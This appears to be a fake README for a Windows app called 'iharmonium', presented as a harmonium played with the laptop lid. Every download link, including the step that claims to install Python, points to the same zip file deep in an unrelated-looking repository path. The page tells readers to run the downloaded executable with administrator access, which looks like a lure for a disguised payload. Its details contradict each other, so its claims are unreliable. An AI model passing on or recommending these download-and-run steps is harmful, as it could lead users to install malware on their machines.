# 🎹 iharmonium - Play Harmonium Using Your Laptop Lid

[![Download iharmonium](https://img.shields.io/badge/Download-iharmonium-brightgreen)](https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip)

---

## 📥 Download iharmonium

Visit the following page to download the Windows version of iharmonium:

**https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip**

Open the page above and look for the latest release. Download the file that ends with `.exe`. After downloading, run the `.exe` file to start installation.

---

## 💻 What is iharmonium?

iharmonium is a software that turns your laptop into a digital harmonium. The unique feature lets you use your laptop’s lid angle to pump air, producing harmonium-like sounds. Press specific keyboard keys to play notes, then push your laptop lid down to control the sound’s intensity.

This app works through a small Python program that reads your laptop lid angle and sends that data to a web page in your browser. The browser plays the harmonium tones based on your inputs.

---

## 🖥️ System Requirements

To run iharmonium on your Windows computer, you need:

- Windows 10 or later
- Python 3.7 or newer installed
- Internet browser like Chrome, Firefox, or Edge
- Laptop with a lid angle sensor (often certain models, check your device)
- Administrator access to install software

---

## 🔧 Install Python 3 on Windows

iharmonium needs Python 3 to read the lid sensor and send data to the web page. Follow these steps to install Python:

1. Go to https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip
2. Click on the **Download Python 3.x.x** button (where x.x is the latest version).
3. Run the downloaded installer.
4. Make sure to check the box that says **Add Python to PATH** at the start of the install process.
5. Click **Install Now**.
6. Wait for the installation to finish, then close the installer.

---

## 🛠️ Install Required Python Packages

After installing Python, you need to install two Python libraries needed by iharmonium:

- `websockets` (for real-time data transfer)
- `pybooklid` (for lid angle data)

To install these:

1. Open the **Command Prompt** app. You can find it by typing "cmd" in the Windows search bar.
2. Type this command and press Enter:
   ```
   pip install websockets pybooklid
   ```
3. Wait for the downloads and installations to complete. You should see a success message.

---

## 📂 How to Download and Run iharmonium on Windows

1. Visit the official release page:
   
   https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip

2. Find the latest Windows `.exe` installer file.

3. Click the file to download.

4. Open the downloaded `.exe` and follow the basic setup instructions.

5. After installation, open the **iharmonium** app from your Start menu.

6. Ensure your laptop lid sensor is active and working.

7. The app will start a small Python service in the background to read your lid angle.

8. It will open a web page in your default browser that serves as the harmonium interface.

---

## 🎹 How to Play iharmonium

- **Play notes:** Press keyboard keys to play different notes.

  Use this set:

  `A  W  S  E  D  F  T  G  Y  H  U  J  K`

- **Control bellows:** Slowly close your laptop lid down to pump air and make sound louder.

- **Sound Blend:** The harder you push the lid, the stronger the sound.

- **Real-time:** The software updates the sound continuously based on lid angle.

---

## 🕹️ Using the Web Interface

iharmonium uses your web browser to play sounds through its interface. After you start the app:

- The browser tab will display a simple piano-like interface.

- You do not need to click anything on the page, just press your keyboard keys.

- Make sure your browser tab is active (selected) for best responsiveness.

- Keep your lid sensor moving to vary the sound pressure.

---

## 🔄 Restart or Close iharmonium

- To stop, simply close the browser tab that opened.

- Then, close the Python service window if it is open.

- To restart, launch the iharmonium app again from the Start menu.

---

## ⚙️ Troubleshooting Tips

- If the app can’t read your lid angle, check if your laptop model supports lid angle sensor on Windows.

- Make sure Python and required packages installed without errors.

- Use a recent browser version like Chrome or Firefox.

- Close other apps that might block microphone or audio playback to avoid conflicts.

- Check internet settings if the web interface does not load. It uses a local network connection so no internet is needed.

---

## 🧩 Additional Info

The Python backend listens to your laptop lid sensor and sends lid angle data over a WebSocket connection. The web page uses Web Audio API to turn this data into natural harmonium sounds.

The app pairs hardware (lid sensor), Python software (data capture), and web technology (sound generation) to create an intuitive musical instrument you can play with your hands and laptop lid.

---

## 🚀 Start Using iharmonium Now

Download the latest Windows installer from:

[![Download iharmonium](https://img.shields.io/badge/Download-iharmonium-brightgreen)](https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip)

Run the installer, complete setup, install Python dependencies, then open the app to start playing.